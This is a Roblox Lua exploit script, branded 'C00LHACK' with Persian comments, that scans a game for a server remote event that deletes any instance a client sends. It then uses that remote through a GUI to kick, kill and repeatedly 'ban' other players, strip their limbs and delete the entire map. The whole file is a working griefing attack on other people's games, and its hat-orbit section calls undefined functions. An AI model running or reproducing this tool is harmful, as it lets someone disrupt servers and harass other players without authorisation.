local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()
local selectedRemote = nil
local remoteType = "None" -- میتونه "AllAccess" یا "PartOnly" باشه
local bannedPlayers = {}

local function Notify(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = duration;
            Icon = "http://www.roblox.com/asset/?id=158118263";
        })
    end)
end

-- ==== ساخت رابط کاربری (UI) ====
if gethui and gethui():FindFirstChild("MasterpieceScannerAdmin") then
    gethui().MasterpieceScannerAdmin:Destroy()
elseif CoreGui:FindFirstChild("MasterpieceScannerAdmin") then
    CoreGui.MasterpieceScannerAdmin:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MasterpieceScannerAdmin"
ScreenGui.ResetOnSpawn = false

local function getGuiParent()
    if gethui then return gethui()
    elseif CoreGui and pcall(function() local _ = CoreGui.Name end) then return CoreGui
    else return player:WaitForChild("PlayerGui") end
end
ScreenGui.Parent = getGuiParent()

local function createUI(class, properties)
    local inst = Instance.new(class)
    for k, v in pairs(properties) do inst[k] = v end
    return inst
end

local ScanLabel = createUI("TextLabel", {
    Size = UDim2.new(0, 300, 0, 50), Position = UDim2.new(0.5, -150, 0.5, -25),
    BackgroundColor3 = Color3.fromRGB(30, 30, 30), BorderColor3 = Color3.fromRGB(255, 170, 0),
    BorderSizePixel = 2, TextColor3 = Color3.fromRGB(255, 170, 0), Text = "Initializing Scanner...",
    Font = Enum.Font.SourceSansBold, TextSize = 16, Parent = ScreenGui
})

local MainFrame = createUI("Frame", {
    Size = UDim2.new(0, 420, 0, 380), Position = UDim2.new(0.5, -210, 0.5, -190),
    BackgroundColor3 = Color3.fromRGB(35, 35, 35), BorderColor3 = Color3.fromRGB(0, 0, 0),
    BorderSizePixel = 2, Active = true, Visible = false, Parent = ScreenGui
})

local function dragify(Frame)
    local dragToggle, dragInput, dragStart, startPos
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
            dragToggle = true; dragStart = input.Position; startPos = Frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragToggle = false end end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then 
            local Delta = input.Position - dragStart
            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        end
    end)
end
dragify(MainFrame)

local StatusLabel = createUI("TextLabel", {
    Size = UDim2.new(1, 0, 0, 25), BackgroundColor3 = Color3.fromRGB(20, 20, 20),
    BorderSizePixel = 0, Text = "Made By C00LHACK | Selected Remote: None",
    TextColor3 = Color3.fromRGB(0, 255, 100), TextSize = 13, Font = Enum.Font.SourceSansBold, Parent = MainFrame
})

local ContentContainer = createUI("Frame", {
    Size = UDim2.new(1, -20, 1, -35), Position = UDim2.new(0, 10, 0, 30),
    BackgroundTransparency = 1, Parent = MainFrame
})

local LeftFrame = createUI("Frame", {Size = UDim2.new(0.48, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(45, 45, 45), BorderColor3 = Color3.fromRGB(20, 20, 20), BorderSizePixel = 1, Parent = ContentContainer})
createUI("TextLabel", {Size = UDim2.new(1, 0, 0, 25), BackgroundTransparency = 1, Text = "- Target Actions -", TextColor3 = Color3.fromRGB(220, 220, 220), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = LeftFrame})

local KickTextBox = createUI("TextBox", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 35), BackgroundColor3 = Color3.fromRGB(20, 20, 20), BorderColor3 = Color3.fromRGB(70, 70, 70), Text = "", PlaceholderText = "Name/All/Others", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSans, TextSize = 14, Parent = LeftFrame})
local KickBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 35), Position = UDim2.new(0, 10, 0, 75), BackgroundColor3 = Color3.fromRGB(180, 40, 40), BorderSizePixel = 1, Text = "Kick", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 15, Parent = LeftFrame})
local KillBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 35), Position = UDim2.new(0, 10, 0, 115), BackgroundColor3 = Color3.fromRGB(140, 0, 0), BorderSizePixel = 1, Text = "Kill", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 15, Parent = LeftFrame})
local BanBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 35), Position = UDim2.new(0, 10, 0, 155), BackgroundColor3 = Color3.fromRGB(200, 0, 0), BorderSizePixel = 1, Text = "Ban", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 15, Parent = LeftFrame})
local LeftKorbloxBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 35), Position = UDim2.new(0, 10, 0, 195), BackgroundColor3 = Color3.fromRGB(30, 30, 30), BorderColor3 = Color3.fromRGB(100, 100, 100), BorderSizePixel = 1, Text = "Korblox Target", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 15, Parent = LeftFrame})

local RightFrame = createUI("Frame", {Size = UDim2.new(0.48, 0, 1, 0), Position = UDim2.new(0.52, 0, 0, 0), BackgroundColor3 = Color3.fromRGB(45, 45, 45), BorderColor3 = Color3.fromRGB(20, 20, 20), BorderSizePixel = 1, Parent = ContentContainer})
createUI("TextLabel", {Size = UDim2.new(1, 0, 0, 25), BackgroundTransparency = 1, Text = "- Server & Accessories -", TextColor3 = Color3.fromRGB(220, 220, 220), Font = Enum.Font.SourceSansBold, TextSize = 13, Parent = RightFrame})

local BtoolsBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 30), BackgroundColor3 = Color3.fromRGB(0, 120, 200), BorderSizePixel = 1, Text = "Btools", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = RightFrame})
local DeleteMapBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 65), BackgroundColor3 = Color3.fromRGB(200, 80, 0), BorderSizePixel = 1, Text = "Delete Map", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = RightFrame})
local HatOrbitBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 100), BackgroundColor3 = Color3.fromRGB(120, 40, 160), BorderSizePixel = 1, Text = "HatOrbit", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = RightFrame})
local BlockHatBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 135), BackgroundColor3 = Color3.fromRGB(60, 60, 200), BorderSizePixel = 1, Text = "BlockHat", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = RightFrame})
local RightKorbloxBtn = createUI("TextButton", {Size = UDim2.new(1, -20, 0, 30), Position = UDim2.new(0, 10, 0, 170), BackgroundColor3 = Color3.fromRGB(30, 30, 30), BorderColor3 = Color3.fromRGB(100, 100, 100), BorderSizePixel = 1, Text = "Korblox Me", TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, TextSize = 14, Parent = RightFrame})

-- تابع قفل کردن دکمه‌هایی که نیاز به دسترسی کامل (غیر پارت) دارن
local function lockButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    btn.TextColor3 = Color3.fromRGB(100, 100, 100)
    btn.Text = btn.Text .. " [LOCKED]"
    btn:SetAttribute("IsLocked", true)
end

local function isValidMapPart(obj)
    if not obj:IsA("BasePart") or obj:IsA("Terrain") or obj.Name:lower() == "baseplate" or obj.Transparency >= 1 or obj.Size.Magnitude > 30 then return false end
    local ancestorModel = obj:FindFirstAncestorOfClass("Model")
    return not (ancestorModel and ancestorModel:FindFirstChildOfClass("Humanoid"))
end

local function GetTestableMapPart()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if isValidMapPart(obj) then return obj end
    end
    return nil
end

local function SmartScan()
    -- سرویس‌های اصلی که ریموت‌ها معمولاً در آن‌ها قرار دارند
    local servicesToScan = {
        Workspace, ReplicatedStorage, StarterGui, StarterPack, 
        game:GetService("Lighting"), game:GetService("JointsService")
    }
    
    local foundRemote = nil
    local rType = "None"
    
    for _, service in ipairs(servicesToScan) do
        for _, v in ipairs(service:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                ScanLabel.Text = "Scanning: " .. v.Name
                
                -- مرحله ۱: تست حذف پارت مپ
                local testPart = GetTestableMapPart()
                local canDeletePart = false
                
                if testPart then
                    pcall(function() v:FireServer(testPart) end)
                    task.wait(0.3)
                    if not testPart or not testPart.Parent then
                        canDeletePart = true
                    end
                end
                
                if canDeletePart then
                    foundRemote = v
                    rType = "PartOnly"
                    
                    -- مرحله ۲: تست روی اینستنس غیر پارت (مثل اسکریپت صدا)
                    local nonPartTarget = game:GetService("StarterPlayer").StarterPlayerScripts:FindFirstChild("RbxCharacterSounds")
                    
                    if nonPartTarget then
                        pcall(function() v:FireServer(nonPartTarget) end)
                        task.wait(0.3)
                        if not nonPartTarget or not nonPartTarget.Parent then
                            rType = "AllAccess"
                            break 
                        end
                    end
                    
                    if rType == "AllAccess" then break end
                end
            end
        end
        if rType == "AllAccess" then break end
    end
    
    return foundRemote, rType
end

task.spawn(function()
    Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
    task.wait(1)
    
    local vRemote, vType = SmartScan()
    
    if vRemote then
        selectedRemote = vRemote
        remoteType = vType
        ScanLabel.Visible = false
        StatusLabel.Text = "C00LHACK | Remote: " .. vRemote.Name .. " [" .. vType .. "]"
        
        -- اعمال قفل هوشمند دکمه ها بر اساس منطق جدید
        if vType == "PartOnly" then
            Notify("Scanner Result", "Part-Only Remote! Non-part tools locked.", 4)
            -- فقط دکمه هایی قفل میشن که نیاز به حذف اینستنس های غیر پارت دارن!
            -- دکمه های Btools, Delete Map, Korblox Target/Me, Kill باز میمونن!
            lockButton(KickBtn)
            lockButton(BanBtn)
            lockButton(HatOrbitBtn)
            lockButton(BlockHatBtn)
        else
            Notify("Scanner Result", "Remote Found! All tools available.", 4)
        end
        
        MainFrame.Visible = true
    else
        Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
        ScanLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        ScanLabel.Text = "No Vulnerable Remote Found!"
        task.wait(2)
        if ScreenGui then ScreenGui:Destroy() end
    end
end)

-- ==== لاجیک دکمه ها ====

local function checkLock(btn) return btn:GetAttribute("IsLocked") end
local function getPlayer(name)
    name = name:lower()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name or p.DisplayName:lower():sub(1, #name) == name then return p end
    end
    return nil
end

local function KickTarget(targetPlayer)
    if selectedRemote and targetPlayer then
        pcall(function()
            selectedRemote:FireServer(targetPlayer)
            if targetPlayer.Character then selectedRemote:FireServer(targetPlayer.Character) end
        end)
    end
end

local function KillTarget(targetPlayer)
    if selectedRemote and targetPlayer and targetPlayer.Character then
        local char = targetPlayer.Character
        local part = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildOfClass("BasePart")
        if part then pcall(function() selectedRemote:FireServer(part) end) end
    end
end

local function DeleteRightLeg(targetCharacter)
    if not selectedRemote or not targetCharacter then return end
    local legParts = {"Right Leg", "RightFoot", "RightLowerLeg", "RightUpperLeg"}
    for _, partName in ipairs(legParts) do
        local part = targetCharacter:FindFirstChild(partName)
        if part then pcall(function() selectedRemote:FireServer(part) end) end
    end
end

KickBtn.MouseButton1Click:Connect(function()
    if checkLock(KickBtn) then return end
    local targetText = string.lower(KickTextBox.Text)
    if targetText == "" then return end
    if targetText == "all" then
        for _, p in pairs(Players:GetPlayers()) do if p ~= player then KickTarget(p) end end
        task.wait(0.5); KickTarget(player)
    elseif targetText == "others" then
        for _, p in pairs(Players:GetPlayers()) do if p ~= player then KickTarget(p) end end
    else
        local targetPlayer = getPlayer(targetText)
        if targetPlayer then KickTarget(targetPlayer) end
    end
end)

KillBtn.MouseButton1Click:Connect(function()
    if checkLock(KillBtn) then return end
    local targetText = string.lower(KickTextBox.Text)
    if targetText == "" then return end
    if targetText == "all" then
        for _, p in pairs(Players:GetPlayers()) do KillTarget(p) end
    elseif targetText == "others" then
        for _, p in pairs(Players:GetPlayers()) do if p ~= player then KillTarget(p) end end
    else
        local targetPlayer = getPlayer(targetText)
        if targetPlayer then KillTarget(targetPlayer) end
    end
end)

BanBtn.MouseButton1Click:Connect(function()
	if checkLock(BanBtn) then return end
    local targetText = string.lower(KickTextBox.Text)
    if targetText == "" then return end
    if targetText == "all" then
        for _, p in pairs(Players:GetPlayers()) do 
            if p ~= player then 
                bannedPlayers[p.UserId] = true
                KickTarget(p) 
            end 
        end
    elseif targetText == "others" then
        for _, p in pairs(Players:GetPlayers()) do 
            if p ~= player then 
                bannedPlayers[p.UserId] = true
                KickTarget(p) 
            end 
        end
    else
        local targetPlayer = getPlayer(targetText)
        if targetPlayer and targetPlayer ~= player then
            bannedPlayers[targetPlayer.UserId] = true
            KickTarget(targetPlayer)
        end
    end
end)

Players.PlayerAdded:Connect(function(newPlayer)
    if bannedPlayers[newPlayer.UserId] then
        task.wait(1)
        KickTarget(newPlayer)
    end
end)

LeftKorbloxBtn.MouseButton1Click:Connect(function()
    if checkLock(LeftKorbloxBtn) then return end
    local targetText = string.lower(KickTextBox.Text)
    if targetText == "" then return end
    local targetPlayer = getPlayer(targetText)
    if targetPlayer and targetPlayer.Character then
        DeleteRightLeg(targetPlayer.Character)
    end
end)

RightKorbloxBtn.MouseButton1Click:Connect(function()
    if checkLock(RightKorbloxBtn) then return end
    if player.Character then
        DeleteRightLeg(player.Character)
    end
end)

HatOrbitBtn.MouseButton1Click:Connect(function()
    if checkLock(HatOrbitBtn) then return end
    if not selectedRemote or not player.Character then return end
    local char = player.Character
    local hum = char:FindFirstChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    isOrbiting = not isOrbiting

    if isOrbiting then
        HatOrbitBtn.Text = "Stop Orbit"
        HatOrbitBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
        cleanupOrbit()

        partsFolder = Instance.new("Folder", char)
        partsFolder.Name = "wacky parts folder"

        for _, v in pairs(hum:GetAccessories()) do
            local handle = v:FindFirstChild("Handle")
            if handle then
                handle.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                handle.CanCollide = false

                for _, joint in pairs(handle:GetDescendants()) do
                    if joint:IsA("JointInstance") then
                        pcall(function() selectedRemote:FireServer(joint) end)
                        joint:Destroy()
                    end
                end

                table.insert(activeHats, handle)
            end
        end

        for _, handle in pairs(activeHats) do
            local still = Instance.new("BodyAngularVelocity", handle)
            still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            still.AngularVelocity = Vector3.new(0, 0, 0)

            local align = Instance.new("AlignPosition", handle)
            align.MaxForce = 1000000
            align.MaxVelocity = math.huge
            align.RigidityEnabled = false
            align.ApplyAtCenterOfMass = true
            align.Responsiveness = 200

            local a0 = Instance.new("Attachment", handle)
            local a1 = Instance.new("Attachment", char.Head)
            align.Attachment0 = a0
            align.Attachment1 = a1

            table.insert(mov, a1)
            table.insert(mov2, still)

            local part = Instance.new("Part", partsFolder)
            part.Anchored = true
            part.Size = Vector3.new(1, 1, 1)
            part.Transparency = 1
            part.CanCollide = false
            table.insert(par, part)
        end

        velocityCon = RunService.Heartbeat:Connect(function()
            for _, handle in pairs(activeHats) do
                if handle and handle.Parent then
                    handle.Velocity = Vector3.new(0, 30, 0)
                end
            end
        end)

        local l = 1

        alignCon = RunService.RenderStepped:Connect(function()
            if not char or not hrp or not hrp.Parent then
                isOrbiting = false
                HatOrbitBtn.Text = "HatOrbit"
                HatOrbitBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 160)
                cleanupOrbit()
                return
            end

            local speed = getSpeed()
            local offset = getOffset()
            local angular = Vector3.new(0, 0, 0)

            l = (l >= 360 and 1 or l + speed)

            for i, v in pairs(par) do
                if v and hrp then
                    v.CFrame = CFrame.new(hrp.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0)
                end
            end

            for i, v in pairs(mov) do
                if par[i] then 
                    v.Position = Vector3.new(hrp.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, hrp.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, hrp.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z) 
                end
            end

            for _, v in pairs(mov2) do v.AngularVelocity = angular end
        end)
    else
        HatOrbitBtn.Text = "HatOrbit"
        HatOrbitBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 160)
        cleanupOrbit()
    end
end)

BlockHatBtn.MouseButton1Click:Connect(function()
    if checkLock(BlockHatBtn) then return end
    if not selectedRemote or not player.Character then return end
    BlockHatBtn.Text = "Blocking..."
    for _, acc in ipairs(player.Character:GetChildren()) do
        if acc:IsA("Accessory") and acc:FindFirstChild("Handle") then
            for _, mesh in ipairs(acc.Handle:GetChildren()) do
                if mesh:IsA("SpecialMesh") or mesh:IsA("BlockMesh") or mesh:IsA("CylinderMesh") or mesh:IsA("Mesh") then
                    pcall(function() selectedRemote:FireServer(mesh) end)
                end
            end
        end
    end
    task.wait(0.5)
    BlockHatBtn.Text = "BlockHat"
end)

DeleteMapBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return end
    DeleteMapBtn.Text = "Deleting..."
    task.spawn(function()
        for i, obj in ipairs(Workspace:GetDescendants()) do
            if (obj:IsA("BasePart") or obj:IsA("Model")) and obj.Parent then
                pcall(function() selectedRemote:FireServer(obj) end)
            end
            if i % 500 == 0 then task.wait() end
        end
        DeleteMapBtn.Text = "Delete Map"
    end)
end)

BtoolsBtn.MouseButton1Click:Connect(function()
    local tool = Instance.new("Tool")
    tool.Name = "Delete Tool"
    tool.RequiresHandle = false
    tool.TextureId = "rbxasset://Textures/Hammer.png"
    
    -- ساخت قاب هایلایت برای نشان دادن شیء انتخاب شده
    local Field = Instance.new("SelectionBox")
    Field.Color3 = Color3.fromRGB(255, 0, 0)
    Field.LineThickness = 0.04
    Field.Parent = getGuiParent()
    
    local equipped = false
    local renderConnection = nil
    
    -- زمانی که ابزار دست بازیکن گرفته می‌شود
    tool.Equipped:Connect(function()
        equipped = true
        mouse.Icon = "rbxasset://textures/HammerCursor.png"
        
        -- حلقه RenderStepped بسیار بهینه‌تر از while loop در Luau است
        renderConnection = RunService.RenderStepped:Connect(function()
            if equipped and mouse.Target then
                Field.Adornee = mouse.Target
            else
                Field.Adornee = nil
            end
        end)
    end)
    
    -- زمانی که ابزار از دست بازیکن کنار گذاشته می‌شود
    tool.Unequipped:Connect(function()
        equipped = false
        Field.Adornee = nil
        mouse.Icon = ""
        if renderConnection then
            renderConnection:Disconnect()
            renderConnection = nil
        end
    end)
    
    -- حذف هایلایت در صورت نابودی ابزار
    tool.Destroying:Connect(function()
        Field:Destroy()
        if renderConnection then renderConnection:Disconnect() end
    end)
    
    -- عملکرد کلیک و حذف پارت
    tool.Activated:Connect(function()
        if mouse.Target and selectedRemote then
            local targetPos = mouse.Hit.Position
            
            pcall(function() selectedRemote:FireServer(mouse.Target) end)
            
            local explosion = Instance.new("Explosion")
            explosion.Position = targetPos
            explosion.BlastRadius = 0
            explosion.BlastPressure = 0
            explosion.DestroyJointRadiusPercent = 0
            explosion.Parent = Workspace
        end
    end)
    
    tool.Parent = player:WaitForChild("Backpack")
end)
